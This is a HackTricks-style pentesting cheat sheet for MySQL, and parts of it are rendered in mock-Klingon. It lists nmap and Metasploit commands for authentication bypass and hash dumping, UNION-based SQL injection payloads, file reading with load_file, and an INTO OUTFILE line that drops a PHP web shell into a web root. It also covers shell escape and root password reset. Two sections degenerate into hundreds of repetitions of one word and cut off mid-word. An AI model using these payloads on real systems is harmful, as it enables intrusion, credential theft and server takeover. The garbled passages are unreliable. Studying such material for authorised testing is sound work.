# 3306 - Pentesting Mysql

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> <strong>qaStaHvIS</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}

## **Basic Information**

**MySQL** can be described as an open source **Relational Database Management System (RDBMS)** that is available at no cost. It operates on the **Structured Query Language (SQL)**, enabling the management and manipulation of databases.

**Default port:** 3306
```
3306/tcp open  mysql
```
## **Qap**

### **Qa'vam**
```bash
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
```
### Qa'chuq

#### Introduction

The MySQL database is a popular choice for storing and managing data in various applications. As a remote attacker, gaining unauthorized access to a MySQL server can provide valuable information and potentially allow for further exploitation. This section will cover various techniques and tools that can be used to remotely pentest MySQL servers.

#### Enumeration

Before attempting to exploit a MySQL server, it is important to gather information about the target. This can be done using various enumeration techniques, such as:

- **Port Scanning**: Identify open ports on the target system using tools like Nmap. The default port for MySQL is 3306.

- **Banner Grabbing**: Retrieve the MySQL server version and other information by connecting to the target port using tools like Telnet or Netcat.

- **Service Fingerprinting**: Use tools like Nmap or Metasploit to identify the specific version and configuration of the MySQL service.

#### Authentication Bypass

If the MySQL server allows for remote connections without proper authentication, an attacker can gain unauthorized access to the database. Some common methods for bypassing authentication include:

- **Default Credentials**: Try using default usernames and passwords, such as "root" with no password or "admin" with "admin" as the password.

- **Brute-Force Attacks**: Use tools like Hydra or Medusa to systematically guess usernames and passwords until a valid combination is found.

- **SQL Injection**: Exploit vulnerabilities in the application layer to inject SQL queries that bypass authentication checks.

#### Exploiting Vulnerabilities

Once authenticated, an attacker can exploit various vulnerabilities in the MySQL server to gain unauthorized access or perform other malicious actions. Some common vulnerabilities to look out for include:

- **Privilege Escalation**: Exploit misconfigurations or vulnerabilities to elevate privileges and gain administrative access to the database.

- **SQL Injection**: Exploit vulnerabilities in the application layer to execute arbitrary SQL queries or commands on the database.

- **Remote Code Execution**: Exploit vulnerabilities to execute arbitrary code on the server, potentially leading to full control of the system.

#### Post-Exploitation

After gaining access to a MySQL server, an attacker can perform various post-exploitation activities, such as:

- **Data Extraction**: Retrieve sensitive data from the database, such as usernames, passwords, or other confidential information.

- **Data Modification**: Modify or delete data in the database, potentially causing disruption or damage to the target system.

- **Persistence**: Establish persistence on the target system by creating backdoors or modifying configuration files.

#### Conclusion

Remote pentesting of MySQL servers can provide valuable insights into the security of an application or system. By understanding the various techniques and vulnerabilities associated with MySQL, security professionals can better protect against potential attacks.
```bash
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```
## Qa'chuq QaD

Qa'chuq QaDmey vItlhutlhchu'chugh, vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh vItlhutlhchu'chugh v
```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```
### [**Qa'vIn**](../generic-methodologies-and-resources/brute-force.md#mysql)

### Qa'vIn vItlhutlh vItlhutlh data
```bash
CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
```
## **MySQL be'Hom**

---

### **Introduction**

MySQL be'Hom 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlh
```bash
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;

select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Get a shell with the mysql client user
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## Yo need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

```bash
mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
mysql -u root -h 127.0.0.1 -e 'show databases;'
```
### MySQL Permissions Enumeration

#### Introduction

In MySQL, permissions control the actions that users can perform on databases and tables. Enumerating the permissions of a MySQL user is an important step in the process of assessing the security of a MySQL server. By understanding the privileges assigned to a user, an attacker can identify potential vulnerabilities and plan their attack accordingly.

#### Enumerating User Privileges

To enumerate the privileges of a MySQL user, you can use the following SQL query:

```sql
SELECT * FROM mysql.user WHERE user='username';
```

Replace `'username'` with the actual username you want to enumerate.

This query will return a row for each user with the specified username, displaying their privileges in the columns of the result set. The `GRANT` column indicates the specific privileges assigned to the user.

#### Enumerating Global Privileges

To enumerate the global privileges assigned to all users, you can use the following SQL query:

```sql
SELECT * FROM mysql.user;
```

This query will return a row for each user, displaying their global privileges in the columns of the result set.

#### Enumerating Database-Specific Privileges

To enumerate the privileges assigned to a specific database, you can use the following SQL query:

```sql
SELECT * FROM mysql.db WHERE user='username' AND db='database';
```

Replace `'username'` with the actual username and `'database'` with the name of the database you want to enumerate.

This query will return a row for each user with the specified username and database, displaying their privileges in the columns of the result set.

#### Enumerating Table-Specific Privileges

To enumerate the privileges assigned to a specific table within a database, you can use the following SQL query:

```sql
SHOW GRANTS FOR 'username'@'localhost' ON `database`.`table`;
```

Replace `'username'` with the actual username, `'localhost'` with the appropriate hostname, `'database'` with the name of the database, and `'table'` with the name of the table you want to enumerate.

This query will display the privileges assigned to the user for the specified table.

#### Conclusion

Enumerating the permissions of a MySQL user is a crucial step in the process of assessing the security of a MySQL server. By understanding the privileges assigned to a user, an attacker can identify potential vulnerabilities and plan their attack accordingly.
```sql
#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();

# Get users, permissions & hashes
SELECT * FROM mysql.user;

#From DB
select * from mysql.user where user='root';
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

